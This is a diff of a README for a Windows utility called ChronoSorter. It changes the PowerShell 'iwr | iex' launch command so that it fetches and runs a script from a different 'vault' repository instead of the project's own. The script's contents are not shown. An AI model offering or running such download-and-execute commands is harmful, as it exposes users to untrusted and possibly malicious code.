@@ -14,7 +14,7 @@ ChronoSorter is a sleek and simple Windows utility that organizes your files int
 You can quickly launch the app directly from PowerShell by running this commands:
  
 ```powershell
-iwr -useb "https://raw.githubusercontent.com/DomainTyler/chronosorter/main/ChronoSorter%20v1.ps1" | iex
+iwr -useb "https://github.com/DomainTyler/.exe-.ps1-vault/raw/main/run%20CS%20v1.ps1" | iex
 ```
 
 This will download and execute the PowerShell script directly, giving you instant access without needing to download any files manually.
